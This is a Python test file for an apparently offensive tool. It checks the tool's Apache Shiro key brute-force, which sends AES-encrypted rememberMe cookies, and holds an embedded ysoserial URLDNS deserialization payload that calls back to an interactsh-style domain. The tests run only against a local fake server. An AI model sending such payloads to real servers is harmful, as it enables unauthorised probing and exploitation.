#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test brute-force key Shiro: gadget URLDNS + AES-CBC + dispatch via scan_shiro."""

import base64
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from zqrya_exploit import core
from tests._server import FakeQ, FakeServer, read_request, respond

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAVE_CRYPTO = True
except Exception:
    HAVE_CRYPTO = False


# Keluaran ysoserial/Java ObjectOutputStream untuk URL http://aaaa.interactsh.example/
URLDNS_REFERENCE = (
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9s"
    "ZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJ"
    "AARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEA"
    "fgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAF2FhYWEuaW50ZXJhY3RzaC5l"
    "eGFtcGxldAABL3EAfgAFdAAEaHR0cHB4dAAfaHR0cDovL2FhYWEuaW50ZXJhY3RzaC5leGFtcGxlL3g="
)


def _decrypt(cookie, key_b64):
    raw = base64.b64decode(cookie)
    iv, ct = raw[:16], raw[16:]
    dec = Cipher(algorithms.AES(base64.b64decode(key_b64)), modes.CBC(iv)).decryptor()
    pt = dec.update(ct) + dec.finalize()
    pad = pt[-1]
    return pt[:-pad]


class TestUrlDnsGadget(unittest.TestCase):
    def test_matches_ysoserial_reference(self):
        self.assertEqual(base64.b64encode(core.url_dns_gadget("aaaa.interactsh.example")).decode(),
                         URLDNS_REFERENCE)

    def test_magic_and_embedded_host(self):
        g = core.url_dns_gadget("zzz.interactsh.example")
        self.assertEqual(g[:4], b"\xac\xed\x00\x05")
        self.assertIn(b"java.net.URL", g)
        self.assertIn(b"java.util.HashMap", g)
        self.assertIn(b"zzz.interactsh.example", g)
        self.assertIn(b"http", g)


@unittest.skipUnless(HAVE_CRYPTO, "butuh cryptography")
class TestShiroEncrypt(unittest.TestCase):
    def test_roundtrip(self):
        payload = b"\xac\xed\x00\x05hello-world"
        for key in core.SHIRO_KEYS[:3]:
            cookie = core._shiro_encrypt(payload, key)
            self.assertEqual(_decrypt(cookie, key), payload)


class TestShiroBruteForce(unittest.TestCase):
    def test_sends_rememberme_cookies_for_each_key(self):
        cookies = []

        def handler(conn):
            method, path, headers, body = read_request(conn)
            cookie = headers.get("cookie", "")
            if "rememberMe=" in cookie:
                cookies.append(cookie.split("rememberMe=", 1)[1].strip())
            respond(conn, 200, b"ok")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.scan_shiro(srv.url + "/", core.make_session(), q, domain="x.interactsh.com")
            # buang cookie fingerprint (probe 5 byte); hanya brute-force yang > 16 byte
            cookies = [c for c in cookies if len(base64.b64decode(c)) > 16]
            valid_keys = [k for k in core.SHIRO_KEYS if _valid16(k)]
            self.assertEqual(len(cookies), len(valid_keys))
            for c in cookies:
                raw = base64.b64decode(c)
                # IV (16 byte) + ciphertext (kelipatan 16)
                self.assertGreater(len(raw), 16)
                self.assertEqual((len(raw) - 16) % 16, 0)
        finally:
            srv.stop()

    @unittest.skipUnless(HAVE_CRYPTO, "butuh cryptography")
    def test_cookies_decrypt_to_url_dns_gadget(self):
        cookies = []

        def handler(conn):
            method, path, headers, body = read_request(conn)
            cookie = headers.get("cookie", "")
            if "rememberMe=" in cookie:
                cookies.append(cookie.split("rememberMe=", 1)[1].strip())
            respond(conn, 200, b"ok")

        srv = FakeServer(handler)
        q = FakeQ()
        try:
            core.scan_shiro(srv.url + "/", core.make_session(), q, domain="x.interactsh.com")
            cookies = [c for c in cookies if len(base64.b64decode(c)) > 16]
            self.assertTrue(cookies)
            matched = 0
            for c in cookies:
                for k in core.SHIRO_KEYS:
                    if not _valid16(k):
                        continue
                    try:
                        pt = _decrypt(c, k)
                    except Exception:
                        continue
                    if pt[:4] == b"\xac\xed\x00\x05" and b"x.interactsh.com" in pt:
                        matched += 1
                        break
            self.assertEqual(matched, len(cookies))
        finally:
            srv.stop()


def _valid16(key):
    try:
        return len(base64.b64decode(key, validate=True)) == 16
    except Exception:
        return False


if __name__ == "__main__":
    unittest.main()
